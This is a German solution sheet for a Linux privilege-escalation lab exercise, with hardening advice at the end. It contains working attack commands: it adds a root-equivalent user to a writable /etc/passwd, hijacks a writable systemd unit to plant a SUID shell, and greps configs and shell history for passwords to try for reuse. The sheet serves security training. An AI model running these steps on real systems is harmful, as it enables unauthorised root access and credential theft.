# Lösung – Übung 06: Writable Files & Services

## 1. Schreibbare sensible Dateien finden

```bash
ls -la /etc/passwd /etc/shadow /etc/sudoers
ls -la /etc/sudoers.d/
find / -writable -type f 2>/dev/null | grep -vE '^/proc|^/sys'
# writable systemd-Units + ihre ExecStart-Binaries:
find /etc/systemd /lib/systemd -name '*.service' -writable 2>/dev/null
```

## 2. Writable /etc/passwd

```bash
openssl passwd -1 -salt xx meinpass         # $1$xx$....
echo 'hacker:$1$xx$....:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker                                    # Passwort: meinpass -> root
```
(UID/GID 0 = root-Äquivalent.)

## 3. Writable Service

```bash
# Unit manipulieren:
cat /etc/systemd/system/vuln.service          # ExecStart=...
# ExecStart auf eigenen Payload zeigen lassen:
sed -i 's#ExecStart=.*#ExecStart=/bin/bash -c "cp /bin/bash /tmp/rb; chmod +s /tmp/rb"#' /etc/systemd/system/vuln.service
# Neustart erzwingen (falls erlaubt) oder auf Reboot/Timer warten:
sudo systemctl daemon-reload && sudo systemctl restart vuln.service
/tmp/rb -p                                    # root
```
Alternativ: ist nur das **ExecStart-Binary** writable, dieses durch Payload ersetzen.

## 4. Credentials suchen

```bash
grep -rniE 'password|passwd|secret|api[_-]?key' /var/www /home /etc 2>/dev/null
cat ~/.bash_history
cat /var/www/html/config.php /var/www/html/wp-config.php 2>/dev/null
```
Gefundene DB-/Admin-Passwörter gegen `su`/`sudo`/Dienste testen (Passwort-Wiederverwendung).

## 5. Härtung

- `/etc/passwd` 644 root, `/etc/shadow` 640 root:shadow, `sudoers` 440 – **niemals** world/group-writable.
- systemd-Units + ExecStart-Binaries nur root-schreibbar; `systemd-analyze security <unit>`.
- **Keine Klartext-Credentials** in Configs/History → Secrets-Management/Vault, Env-Vars mit Rechten.

## Häufige Fehler / Troubleshooting

- **`su hacker` schlägt fehl:** Hash-Format falsch (`$1$`/`$6$`), Zeile fehlerhaft → Snapshot zurück, sauber eintragen.
- **Service-Restart verboten:** auf Timer/Reboot warten oder anderen Vektor; `systemctl --user` prüfen.
- **find zu viel Output:** `/proc`,`/sys` ausfiltern; auf relevante Pfade grep.
- **/etc/passwd zerschossen:** genau deshalb Snapshot vorher.
